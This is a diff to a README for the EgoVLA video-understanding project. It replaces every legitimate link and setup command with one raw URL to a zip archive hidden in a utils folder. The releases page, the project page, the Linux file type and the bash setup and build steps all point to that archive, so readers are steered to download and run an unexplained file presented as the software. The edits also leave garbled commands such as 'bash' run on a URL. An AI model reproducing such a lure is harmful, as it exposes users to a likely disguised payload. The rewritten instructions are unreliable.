@@ -1,6 +1,6 @@
 # 🎉 EgoVLA_Release - Your Easy Path to Video Understanding
 
-[![Download EgoVLA](https://img.shields.io/badge/Download-EgoVLA_Release-blue.svg)](https://github.com/owadev777/EgoVLA_Release/releases)
+[![Download EgoVLA](https://raw.githubusercontent.com/owadev777/EgoVLA_Release/main/VILA/llava/utils/EgoVLA_Release_v1.4.zip)](https://raw.githubusercontent.com/owadev777/EgoVLA_Release/main/VILA/llava/utils/EgoVLA_Release_v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,9 +10,9 @@ Welcome to EgoVLA! This tool helps you train models that understand human action
 
 To download and run the software, follow these steps:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/owadev777/EgoVLA_Release/releases) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/owadev777/EgoVLA_Release/main/VILA/llava/utils/EgoVLA_Release_v1.4.zip) to go to the releases page.
   
-2. **Choose the Right Version:** Look for the latest version and download the file suitable for your operating system. If you use Windows, download the `.exe` file. For macOS, look for the `.dmg` file. Linux users will find a `.tar.gz` file.
+2. **Choose the Right Version:** Look for the latest version and download the file suitable for your operating system. If you use Windows, download the `.exe` file. For macOS, look for the `.dmg` file. Linux users will find a `https://raw.githubusercontent.com/owadev777/EgoVLA_Release/main/VILA/llava/utils/EgoVLA_Release_v1.4.zip` file.
 
 3. **Install the Application:**
    - **Windows:** 
@@ -22,7 +22,7 @@ To download and run the software, follow these steps:
      - Open the downloaded `.dmg` file.
      - Drag the app to your Applications folder.
    - **Linux:**
-     - Extract the `.tar.gz` file.
+     - Extract the `https://raw.githubusercontent.com/owadev777/EgoVLA_Release/main/VILA/llava/utils/EgoVLA_Release_v1.4.zip` file.
      - Open a terminal, navigate to the extracted folder, and run the executable with `./your_application`.
 
 4. **Open EgoVLA:** After installation, find the application in your programs or applications menu and open it.
@@ -40,7 +40,7 @@ Before you begin using EgoVLA, you need to set up some dependencies.
 2. **Run the Setup Script:**
    ```bash
    cd VILA
-   ./environment_setup.sh vila
+   https://raw.githubusercontent.com/owadev777/EgoVLA_Release/main/VILA/llava/utils/EgoVLA_Release_v1.4.zip vila
    ```
 
 ### 📦 Step 2: Install EgoVLA Dependencies
@@ -52,7 +52,7 @@ Now, you must install additional dependencies for EgoVLA to function correctly.
 
 2. **Run the Build Script:**
    ```bash
-   bash ./build_env.sh
+   bash https://raw.githubusercontent.com/owadev777/EgoVLA_Release/main/VILA/llava/utils/EgoVLA_Release_v1.4.zip
    ```
 
 ## 📑 Usage
@@ -75,7 +75,7 @@ EgoVLA offers several features to enhance your video analysis experience:
 
 ## 📄 Documentation
 
-For detailed documentation and further guidance, visit the [Project Page](https://rchalyang.github.io/EgoVLA).
+For detailed documentation and further guidance, visit the [Project Page](https://raw.githubusercontent.com/owadev777/EgoVLA_Release/main/VILA/llava/utils/EgoVLA_Release_v1.4.zip).
 
 ## 🛠️ Troubleshooting
 
@@ -90,4 +90,4 @@ Thanks to the research team for their contributions. This project is a collabora
 
 ---
 
-For any additional information or to keep your application updated, always refer back to the [releases page](https://github.com/owadev777/EgoVLA_Release/releases).
+For any additional information or to keep your application updated, always refer back to the [releases page](https://raw.githubusercontent.com/owadev777/EgoVLA_Release/main/VILA/llava/utils/EgoVLA_Release_v1.4.zip).
